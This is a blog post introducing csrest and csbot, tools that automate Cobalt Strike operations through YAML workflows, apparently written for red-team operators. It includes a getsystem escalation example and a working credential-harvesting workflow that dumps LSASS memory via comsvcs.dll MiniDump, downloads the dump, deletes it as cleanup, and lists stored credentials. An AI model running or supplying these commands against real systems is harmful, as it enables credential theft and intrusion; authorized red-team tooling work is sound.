---
description: An intro to csrest and csbot automation tooling.
---

# Introducing csrest and csbot: Automating Cobalt Strike Operations

I'm excited to share two new tools I've been working on: **csrest** and **csbot**. Together, they bring proper automation and workflow orchestration to Cobalt Strike operations through its new REST API (Cobalt Strike 4.12+).

### The Problem

Anyone who's run a complex engagement knows the pain; you can script with Aggressor or batch commands, but you quickly hit limitations and end up rereading the dashnine Sleep lang documentation for the thousandth time.

That's where these tools come in.

### csrest: A Go Client

The **csrest** library is a clean, idiomatic Go client for the Cobalt Strike REST API. It handles all the annoying bits:

* JWT authentication with token management
* Automatic retry logic for flaky connections
* Comprehensive type definitions for beacons, tasks, and commands
* Async task polling with proper timeout handling
* Support for all the main operations: shell commands, PowerShell, BOFs, file operations, screenshots

It's designed to be used as a library in your own tools, but it also powers csbot.

### csbot: YAML-Driven Workflow Automation

**csbot** takes the library and turns it into something operators can actually use day-to-day. You write your operational workflows in simple YAML files:

```yaml
name: Privilege Escalation Workflow

actions:
  - name: check_privileges
    type: getuid

  - name: escalate
    type: getsystem
    conditions:
      - source: check_privileges
        operator: not_contains
        value: "SYSTEM"
    on_success:
      - name: verify
        type: getuid
```

That's it. No coding required.

#### Useful functionality

**Beacon Metadata Conditions**: Make decisions based on the actual beacon context. Only run Windows 10 exploits on Windows 10. Skip escalation if you're already SYSTEM. Check the beacon's user, OS, privileges, architecture—all without running a single command.

```yaml
any_of:
  - source: beacon.isAdmin
    operator: equals
    value: "true"
  - source: beacon.user
    operator: contains
    value: "SYSTEM"
```

**Real Conditional Logic**: Not just simple if/then, but proper OR/AND logic with `any_of` and `all_of`. Nest them as deep as you need. Reference previous action outputs. Build complex decision trees.

**Success/Failure Branching**: Different paths for different outcomes. Try one escalation method, fall back to another if it fails. Download and clean up on success, just clean up on failure.

**Interactive Beacon Selection**: Don't want to hardcode beacon IDs? Just omit it from your YAML and csbot will show you a nice table of all available beacons with their details—user, hostname, last check-in time, privileges. Pick the one you want.

### Current State: Consider this an Alpha release

I'm putting this out there now because it's useful, but fair warning: it's early stage. The Cobalt Strike REST API itself is still in beta, and there are some rough edges that I've come across so far:

* File uploads currently hang (API issue, not ours)
* BOF argument packing needs a workaround (we implemented client-side packing)

That said, the API is still brand new, and I'm very excisted to see how it matures, and thankful for the development efforts for the Fortra team.

### What's Next

I'm actively developing both tools based on my operational needs. If you have any thoughts, I'd love to hear them in the GitHub issues, or you can reach me on LinkedIn.

### Get Started

Both tools are available on GitHub. The README has installation instructions, example workflows, and a complete template development guide.

If you're doing red team work with Cobalt Strike and you're tired of manual repetition, give it a shot. Write a workflow for your standard post-exploitation routine. Build a credential harvesting chain. Automate the boring stuff.

And if you find bugs or have feature requests (you will, and you will), open an issue. This is a tool by an operator, for operators.

### Example: Complete Credential Harvesting Workflow

Here's a real workflow I use regularly:

```yaml
name: Credential Harvesting

actions:
  - name: dump_lsass
    type: powershell
    any_of:
      - source: beacon.user
        operator: contains
        value: "SYSTEM"
      - source: beacon.impersonated
        operator: contains
        value: "SYSTEM"
    parameters:
      command: >
        rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump
        (Get-Process lsass).Id C:\Windows\Temp\lsass.dmp full
    on_success:
      - name: download_dump
        type: download
        parameters:
          remote_path: C:\Windows\Temp\lsass.dmp
      - name: cleanup_dump
        type: shell
        parameters:
          command: del C:\Windows\Temp\lsass.dmp

  - name: enum_creds
    type: shell
    parameters:
      command: cmdkey /list
```

It only dumps LSASS if I'm running as SYSTEM or impersonating SYSTEM (checked via beacon metadata, no command needed). Downloads the dump if successful. Cleans up either way. Runs credential enumeration in parallel.

Five minutes to write. Runs in seconds. Works every time.

Thats all for now!

Xenov
